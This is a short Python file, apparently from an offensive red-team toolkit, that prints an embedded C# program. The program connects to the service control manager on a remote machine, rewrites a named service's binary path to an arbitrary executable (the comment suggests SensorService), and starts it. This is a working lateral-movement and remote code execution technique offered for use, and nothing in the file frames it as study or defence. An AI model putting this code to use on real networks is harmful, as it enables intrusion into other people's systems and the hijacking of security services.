from concurrent.futures import process
from common.shellcode_formator import to_csharp_array
from common.encrypt_utils import EncryptUtils, Algorithm, Language
import sys


code = """
using System;
using System.Runtime.InteropServices;

namespace ServiceModifier
{
    class Program
    {
        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {
            String target = args[0];
            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            string ServiceName = args[1]; // e.g. SensorService
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            string binary = args[2];
            bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, binary, null, null, null, null, null, null);

            bResult = StartService(schService, 0, null);
        }
    }
}
"""


def get_code():
    print(code)


get_code()
